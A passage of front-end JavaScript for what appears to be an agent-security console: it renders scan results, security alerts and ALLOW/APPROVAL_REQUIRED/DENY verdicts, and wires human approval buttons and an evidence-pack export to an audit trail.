      <dt>Scanned Files</dt><dd>${(s.scans || []).length ? s.scans.map(x => `${esc(x.name || x.tool)}: ${x.verified === false ? "unverified" : x.flagged ? "hidden injection detected" : "clean"}`).join("<br>") : "none"}</dd>
      <dt>Security Alerts</dt><dd>${(s.alerts || []).length ? s.alerts.map(a => `${esc(a.severity)} · ${esc(String(a.reason).slice(0, 90))}`).join("<br>") : "none"}</dd>
      <dt>Tool Effects</dt><dd>${effects.length ? effects.map(x => `<span class="mono">${esc(x.tool)}</span>${x.simulated_delivery ? " (simulated)" : ""}`).join(", ") : "none"}</dd></dl>
      <div class="row" style="margin-top:12px"><a class="btn sm" href="#/graph">Traffic Map</a><a class="btn sm" href="#/audit">Audit Log</a><a class="btn sm" href="#/approvals">Approvals</a></div></section>` : ""}
    <section class="card flat"><div class="eyebrow">Understanding the Verdicts</div><ul class="wb-list small">
      <li>${stamp("ALLOW")} Passed the checkpoint: the action was permitted.</li>
      <li>${stamp("APPROVAL_REQUIRED")} Held at the checkpoint until a human signs off (one-time use).</li>
      <li>${stamp("DENY")} Blocked cold: forbidden by policy or agent was quarantined.</li></ul></section>
  </aside></div>`;
}

function wireRun(el, r) {
  el.querySelectorAll("[data-ap]").forEach(b => b.onclick = async () => {
    const ok = b.dataset.ok === "1";
    const note = await ask(ok ? "Approve this action once?" : "Reject this action?", `<p>${ok ? "It will run exactly once, through the checkpoint, and will be recorded." : "It will not run."} Your reason is saved to the tamper-proof audit trail.</p>`, { ok: ok ? "Approve and run" : "Reject", danger: !ok });
    if (!note) return;
    try {
      await act(`/console/workbench/runs/${encodeURIComponent(r.id)}/approvals/${encodeURIComponent(b.dataset.ap)}`, { approve: ok, note });
    } catch (e) {
      await ask("Approval couldn't be saved", `<p class="ink2">${esc(e.message)}</p>`, { reason: false, ok: "Close" });
    }
    VIEWS.taskrun(el);
  });
  el.querySelectorAll("[data-pack]").forEach(b => b.onclick = async () => {
    b.disabled = true; b.textContent = "Exporting…";
    try {
      const p = await http(`/console/evidence/${encodeURIComponent(b.dataset.pack)}`);
      const blob = new Blob([JSON.stringify(p, null, 1)], { type: "application/json" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = `${b.dataset.pack}.evidence.json`;
      a.click();
      URL.revokeObjectURL(a.href);
      b.textContent = (p._self_check || []).every(c => c.ok) ? "Exported · self-check verified" : "Exported · self-check FAILED";
    } catch (e) { b.textContent = `Export failed: ${e.message}`; }
  });
}
